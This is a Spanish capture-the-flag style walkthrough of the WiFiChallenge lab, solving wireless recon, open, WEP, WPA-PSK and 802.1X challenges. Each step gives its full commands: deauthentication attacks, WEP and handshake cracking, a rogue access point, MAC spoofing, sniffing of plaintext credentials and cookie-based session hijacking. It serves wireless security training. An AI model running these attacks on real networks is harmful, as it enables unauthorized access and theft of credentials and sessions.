# 📡 WiFiChallenge Lab — Ataques sobre redes inalámbricas


## 📋 Índice

1. [Introducción](#1-introducción)
2. [Contexto](#2-contexto)
3. [Recon](#3-recon)
4. [OPN — Redes abiertas](#4-opn--redes-abiertas)
5. [WEP](#5-wep)
6. [PSK](#6-psk)
7. [Recon MGT](#7-recon-mgt)
8. [Evidencia](#8-evidencia)

---

## 1. Introducción

### Objetivos

A partir del laboratorio [WiFiChallenge](https://lab.wifichallenge.com) resolver los siguientes retos:

1. **Recon** — Reconocimiento de redes inalámbricas
2. **OPN** — Ataques sobre redes abiertas
3. **WEP** — Crackeo de cifrado WEP
4. **PSK** — Ataques sobre WPA/WPA2-PSK
5. **Recon MGT** — Reconocimiento en redes Enterprise (802.1X)

---

## 2. Contexto

El laboratorio **WifiChallenge** ofrece una serie de retos que simulan escenarios reales de ataques sobre redes inalámbricas, permitiendo practicar tanto técnicas de reconocimiento como de ataque sobre diferentes protocolos de seguridad WiFi.

---

## 3. Recon

### Pregunta 1 — ¿Cuál es el canal que está utilizando el AP wifi-global?

![Recon cuestión 1](assets/image1.png)

Se listan las interfaces de red disponibles:

![Listado interfaces de red](assets/image2.png)

Se escoge `wlan0` y se activa el **modo monitor** para capturar todos los paquetes cercanos, independientemente de si van destinados al dispositivo o no:

```bash
airmon-ng start wlan0
```

![Modo monitor wlan0](assets/image3.png)

Se crea la interfaz `wlan0mon`:

![Wlan0mon](assets/image4.png)

Se verifica el modo monitor con `iwconfig`:

```bash
iwconfig wlan0mon
```

![Comando iwconfig wlan0mon](assets/image5.png)

Se escanea el tráfico a 5GHz con `airodump`:

```bash
airodump-ng wlan0mon --band abg
```

![Comando airodump](assets/image6.png)

![Tráfico generado airodump wlan0mon](assets/image7.png)

✅ **Respuesta:** El AP `wifi-global` está utilizando el **canal 44**.

---

### Pregunta 2 — ¿Cuál es la MAC del cliente wifi-IT?

![Recon cuestión 2](assets/image8.png)

A partir de la captura de `airodump-ng wlan0mon --band abg` se busca información sobre `wifi-IT`:

![Información wifi-IT airodump](assets/image9.png)

Está emitiendo en el **canal 11**, se especifica el canal:

```bash
airodump-ng wlan0mon -c 11
```

![Especificar el canal a escuchar con airodump](assets/image10.png)

![Resultado airodump canal 11](assets/image11.png)

✅ **Respuesta:** La MAC del cliente de `wifi-IT` es **10:F0:6F:AC:53:52**.

---

### Pregunta 3 — ¿Cuál es la "probe" de 78:C1:A7:BF:72:46?

![Recon cuestión 3](assets/image12.png)

Una **Probe Response** es una trama de gestión enviada por un AP en respuesta a una Probe Request, que contiene información sobre la red (ESSID, velocidades, canal). La columna `Probes` muestra el AP al que está intentando conectarse el cliente:

![Información 78:C1:A7:BF:72:46](assets/image13.png)

✅ **Respuesta:** La probe de esa MAC apunta a **wifi-offices**.

---

### Pregunta 4 — ¿Cuál es el ESSID del AP oculto (MAC F0:9F:C2:6A:88:26)?

![Recon cuestión 4](assets/image14.png)

Se ejecuta `airodump` filtrando por el BSSID del AP oculto:

```bash
airodump-ng wlan0mon --bssid F0:9F:C2:6A:88:26
```

![Airodump filtrado por el BSSID](assets/image15.png)

![Resultado airodump filtrado por BSSID](assets/image16.png)

El AP oculto tiene un ESSID de **9 caracteres**. Se usa el fichero `rockyou-top100000.txt` del entorno, filtrando por el prefijo `wifi-`:

```bash
grep "^wifi-" /root/rockyou-top100000.txt > rockyouModificado.txt
```

![Uso de fichero rockyou](assets/image17.png)

```bash
wc -l rockyouModificado.txt
```

![Conteo líneas rockyouModificado](assets/image18.png)

![Primeros 10 valores rockyouModificado](assets/image19.png)

Se para la antena y se reinicia en el canal 11 donde está emitiendo el AP:

```bash
airmon-ng stop wlan0mon
```

![Comando airmon-ng stop](assets/image20.png)

```bash
airmon-ng start wlan0 11
```

![Restart wlan0mon por el canal 11](assets/image21.png)

Se lanza el ataque de fuerza bruta con `mdk4` contra la MAC del AP oculto con las contraseñas del diccionario filtrado:

```bash
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -w rockyouModificado.txt
```

![Ataque con mdk4](assets/image22.png)

✅ **Respuesta:** El ESSID del AP oculto es **wifi-free**.

---

## 4. OPN — Redes abiertas

### Pregunta 1 — ¿Cuál es la flag en el router AP oculto detrás de las credenciales por defecto?

![OPN cuestión 1](assets/image23.png)

OPN indica red **abierta**, sin contraseña. Se crea un archivo de configuración para conectarse:

```bash
touch conf-free.conf
```

![Crear archivo conf-free.conf](assets/image24.png)

![Contenido conf-free.conf](assets/image25.png)

Se conecta usando `wpa_supplicant` con el protocolo `nl80211`:

```bash
wpa_supplicant -D nl80211 -i wlan2 -c conf-free.conf
```

![Wpa supplicant](assets/image26.png)

Se obtiene IP dinámica via DHCP:

```bash
dhclient wlan2
```

![dhclient](assets/image27.png)

Se navega a la IP obtenida (`192.168.16.1`) e intenta login con credenciales por defecto `admin:admin`:

![Navegador dirección 192.168.16.1](assets/image28.png)

![Flag conseguido](assets/image29.png)

✅ **Flag conseguido** con credenciales por defecto `admin:admin`.

---

### Pregunta 2 — ¿Cuál es la flag en el AP router de la red wifi-guest?

![OPN cuestión 2](assets/image30.png)

Se busca información sobre `wifi-guest` en la captura de airodump:

![Información airodump wifi-guest](assets/image31.png)

Emite en el **canal 6**. Se captura el tráfico específico de ese canal:

```bash
airodump-ng wlan0mon -c 6
```

![Comando airodump canal 6](assets/image32.png)

![Resultado airodump canal 6](assets/image33.png)

El BSSID de `wifi-guest` es `F0:9F:C2:71:22:10`. Se identifica un dispositivo conectado y se copia su MAC para **suplantar su identidad**:

![Dispositivo conectado a wifi-guest](assets/image34.png)

Se apaga la interfaz, se cambia la MAC y se vuelve a levantar:

![Comando set down, apagar la red](assets/image35.png)

Se crea el archivo de configuración `wifi-guest.conf`:

```bash
touch wifi-guest.conf
```

![Fichero wifi-guest.conf](assets/image36.png)

![Contenido wifi-guest.conf](assets/image37.png)

```bash
wpa_supplicant -D nl80211 -i wlan2 -c wifi-guest.conf
```

![Comando wpa_supplicant](assets/image38.png)

```bash
dhclient wlan2
```

![Comando dhclient](assets/image39.png)

Al intentar acceder a `192.168.10.1` con `admin:admin` no se consigue el flag:

![Navegador dirección 192.168.10.1](assets/image40.png)

![Mensaje flag no conseguido](assets/image41.png)

Se captura tráfico HTTP para buscar credenciales expuestas en peticiones POST:

```bash
mkdir capturas
```

![Crear directorio capturas](assets/image42.png)

```bash
airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:10 -w capturas/captura06
```

![Comando airodump wifi-guest](assets/image43.png)

![Listado capturas generadas](assets/image44.png)

Se abre la captura con Wireshark filtrando por HTTP:

```bash
wireshark -r capturas/captura06-01.cap
```

![Abrir captura06-01.cap con wireshark](assets/image45.png)

![Captura06-01.cap wireshark — credenciales en petición POST](assets/image46.png)

Se obtienen usuario y contraseña en texto claro de las peticiones POST. Se intenta login con esas credenciales:

![Login con credenciales obtenidas](assets/image47.png)

![Flag conseguido](assets/image48.png)

✅ **Flag conseguido** capturando credenciales en texto claro del tráfico HTTP.

---

## 5. WEP

### Pregunta 1 — ¿Cuál es la flag en el sitio web de wifi-old AP?

![WEP cuestión 1](assets/image49.png)

Se busca `wifi-old` en la captura de airodump:

![Airodump wifi-old](assets/image50.png)

El AP `wifi-old` usa **cifrado WEP**, con BSSID `F0:9F:C2:71:22:11` en el canal 3. Se usa **besside-ng** para crackear todas las redes WEP en rango y capturar handshakes WPA:

```bash
besside-ng -b F0:9F:C2:71:22:11 wlan0mon
```

![Ataque besside](assets/image51.png)

![Resultado ataque con besside](assets/image52.png)

`besside-ng` realiza dos acciones:
- **Captura handshakes WPA** al detectar intentos de conexión de clientes.
- **Captura paquetes WEP** para descifrar la clave.

La contraseña obtenida queda también registrada en el archivo `besside.log`:

![Besside.log](assets/image53.png)

Se crea el archivo de configuración `wifi-old.conf` con la contraseña obtenida (sin los `:` del formato WEP):

![Archivo wifi-old.conf](assets/image54.png)

![Contenido wifi-old.conf](assets/image55.png)

```bash
wpa_supplicant -D nl80211 -i wlan2 -c wifi-old.conf
```

![wpa_supplicant wifi-old.conf](assets/image56.png)

```bash
dhclient wlan2
```

![Comando dhclient wlan2](assets/image57.png)

Se accede a la IP obtenida a través del navegador y se obtiene el flag:

![Navegador dirección 192.168.1.1 — Flag conseguido](assets/image58.png)

✅ **Flag conseguido** crackeando el cifrado WEP con besside-ng.

---

## 6. PSK

### Pregunta 1 — ¿Cuál es la contraseña del AP wifi-mobile?

![PSK cuestión 1](assets/image59.png)

El objetivo es capturar el handshake WPA de `wifi-mobile` realizando un **ataque de de-autenticación** para forzar la reconexión del cliente. Se busca información sobre el AP:

![Airodump wifi-mobile](assets/image60.png)

`wifi-mobile` emite en el **canal 6**. Se inicia la captura en ese canal:

```bash
airodump-ng wlan0mon -c 6 --bssid <BSSID> -w capturasWifiMobile
```

![Airodump canal 6 wifi-mobile](assets/image61.png)

En Wireshark se confirma que el **MFP (Management Frame Protection) está deshabilitado**, lo que hace factible el ataque de de-autenticación:

![Captura wireshark wifi-mobile — MFP deshabilitado](assets/image62.png)

Se inicia `wlan1` en el canal 6:

```bash
airmon-ng start wlan1 6
```

![Start wlan1 por el canal 6](assets/image63.png)

![Modo monitor wlan1mon](assets/image64.png)

Se lanza el ataque de de-autenticación con `aireplay-ng`:

```bash
aireplay-ng -0 10 -a <BSSID_AP> wlan1mon
```

![Ataque aireplay](assets/image65.png)

Se captura el handshake y se crackea con `aircrack-ng` usando el diccionario `rockyou`:

```bash
aircrack-ng capturasWifiMobile-01.cap -w /root/rockyou-top100000.txt
```

![Comando aircrack](assets/image66.png)

![Resultado aircrack — contraseña wifi-mobile obtenida](assets/image67.png)

✅ **Contraseña de wifi-mobile obtenida** mediante captura del handshake WPA y ataque de diccionario.

---

### Pregunta 2 — ¿Cuál es la IP del servidor web en la red wifi-mobile?

![PSK cuestión 2](assets/image68.png)

Con la contraseña obtenida se descifra el tráfico capturado en `capturasWifiMobile-02.cap` con `airdecap-ng`:

```bash
airdecap-ng -e wifi-mobile -p <CONTRASEÑA> capturasWifiMobile-02.cap
```

![Comando airdecap](assets/image69.png)

Se genera el archivo `dec.cap` con el tráfico descifrado. Se abre con Wireshark:

```bash
wireshark dec.cap
```

![wireshark archivo dec.cap](assets/image70.png)

Filtrando por tráfico HTTP se identifica la IP del servidor web:

![Captura tráfico HTTP wireshark dec.cap](assets/image71.png)

✅ **Respuesta:** La IP del servidor web en `wifi-mobile` es **192.168.2.1**.

---

### Pregunta 3 — ¿Cuál es la flag después de iniciar sesión en wifi-mobile?

![PSK cuestión 3](assets/image72.png)

Se crea el archivo de configuración `wifi-mobile.conf` con la contraseña obtenida:

```bash
touch wifi-mobile.conf
```

![Archivo wifi-mobile.conf](assets/image73.png)

![Contenido wifi-mobile.conf](assets/image74.png)

```bash
wpa_supplicant -D nl80211 -i wlan2 -c wifi-mobile.conf
```

![Wpa_supplicant wifi-mobile](assets/image75.png)

```bash
dhclient wlan2
```

![Comando dhclient wifi-mobile](assets/image76.png)

Se accede a `192.168.2.1` a través del navegador. Aparece un login:

![Login IP wifi-mobile](assets/image77.png)

En lugar de usar usuario/contraseña, se aprovechan las **cookies de sesión** capturadas en el tráfico descifrado `dec.cap`:

![Cookie de sesión capturada en tráfico dec.cap](assets/image71.png)

Se introduce la cookie en el Cookie Storage del navegador y se recarga la página:

![Cookie Storage](assets/image78.png)

![Flag wifi-mobile](assets/image79.png)

✅ **Flag conseguido** mediante **session hijacking** con la cookie capturada en el tráfico descifrado.

---

### Pregunta 4 — ¿Existe aislamiento de clientes en la red wifi-mobile?

![PSK cuestión 4](assets/image80.png)

Se ejecuta `arp-scan` para descubrir todos los dispositivos en la red local:

```bash
arp-scan --localnet
```

![Arp-scan](assets/image81.png)

Se envían peticiones HTTP a las IPs encontradas:

```bash
curl http://<IP>
```

![Petición curl](assets/image82.png)

✅ **Respuesta:** No existe aislamiento de clientes — todos los dispositivos devuelven el **mismo flag**, confirmando que los clientes pueden comunicarse entre sí.

---

### Pregunta 5 — ¿Cuál es la contraseña de wifi-offices?

![PSK cuestión 5](assets/image83.png)

Al buscar `wifi-offices` en airodump no aparece el ESSID, pero sí aparece en la columna **Probes**, lo que indica que hay clientes intentando conectarse:

```bash
airodump-ng wlan0mon --essid wifi-offices
```

![Comando airodump wifi-offices](assets/image84.png)

![Resultado airodump — wifi-offices en Probes](assets/image85.png)

Se crea un **AP falso (Rogue AP)** con `hostapd-mana` para que los clientes intenten conectarse y se capturen sus handshakes en formato `.hccapx`:

```bash
touch wifi-offices.conf
```

![Crear archivo configuración wifi-offices](assets/image86.png)

![Contenido wifi-offices.conf](assets/image87.png)

```bash
hostapd-mana wifi-offices.conf
```

![Comando hostapd](assets/image88.png)

![Hostapd-mana — peticiones de conexión capturadas](assets/image89.png)

El handshake queda registrado en `wifi-offices.hccapx`:

![wifi-offices.hccapx](assets/image90.png)

Se convierte al formato requerido por Hashcat:

```bash
hcxpcapngtool wifi-offices.hccapx -o wifi-offices.22000
```

![Dar formato hashcat](assets/image91.png)

Se ejecuta Hashcat con ataque de diccionario:

```bash
hashcat -a 0 -m 22000 wifi-offices.22000 /rockyou-top100000.txt --force
```

| Parámetro | Descripción |
|-----------|-------------|
| `-a 0` | Modo ataque por diccionario |
| `-m 22000` | Tipo de hash WPA/WPA2 |
| `wifi-offices.22000` | Handshake capturado en formato Hashcat |
| `/rockyou-top100000.txt` | Diccionario de contraseñas comunes |
| `--force` | Forzar ejecución ignorando advertencias de hardware |

![Uso de hashcat](assets/image92.png)

![Resultado hashcat — contraseña wifi-offices obtenida](assets/image93.png)

✅ **Contraseña de wifi-offices obtenida** mediante Rogue AP + Hashcat.

---

## 7. Recon MGT

### Pregunta 1 — ¿Cuál es el dominio de los usuarios de la red wifi-regional?

![Recon MGT cuestión 1](assets/image94.png)

Se captura el tráfico de `wifi-regional` con airodump:

```bash
airodump-ng wlan0mon --essid wifi-regional
```

![Airodump wifi-regional](assets/image95.png)

![Resultado airodump wifi-regional — canal 44](assets/image96.png)

Está emitiendo en el **canal 44**. Se captura el tráfico guardándolo para Wireshark:

```bash
airodump-ng wlan0mon -c 44 --essid wifi-regional -w wifiRegionalCap
```

![Airodump wifi-regional canal 44](assets/image97.png)

Se abre la captura en Wireshark y se filtra por el **protocolo EAP**. En las tramas `Response Identity` se puede ver el campo `Identity` que contiene el dominio:

```bash
wireshark wifiRegionalCap-01.cap
```

![Wireshark wifi-regional](assets/image98.png)

![wifiRegionalCap-01.cap wireshark — dominio CONTOSOREG visible](assets/image99.png)

✅ **Respuesta:** El dominio de los usuarios de `wifi-regional` es **CONTOSOREG**.

---

### Pregunta 2 — ¿Cuál es la dirección de correo electrónico del certificado del servidor?

![Recon MGT cuestión 2](assets/image100.png)

> En redes MGT (802.1X/EAP), el AP envía su **certificado TLS sin cifrar** al cliente al iniciar la conexión. Esto permite a un atacante extraer información sensible como dominios internos o emails, o usarlo para suplantar el AP con un **Rogue AP**.

Se usa el script `pcapFilter.sh` (disponible en `/root/tools/`) para extraer el certificado de la captura:

```bash
cd /root/tools/
./pcapFilter.sh -C wifiRegionalCap-01.cap
```

![Script pcapFilter](assets/image101.png)

![Certificado obtenido de wifiRegionalCap-01.cap](assets/image102.png)

✅ **Dirección de correo obtenida** del certificado TLS del servidor extraído de la captura.

---

## 8. Evidencia

Capturas de la plataforma WifiChallenge mostrando los retos resueltos:

![Evidencia Recon](assets/image103.png)

![Evidencia OPN](assets/image104.png)

![Evidencia WEP](assets/image105.png)

![Evidencia PSK](assets/image106.png)

![Evidencia Recon MGT](assets/image107.png)
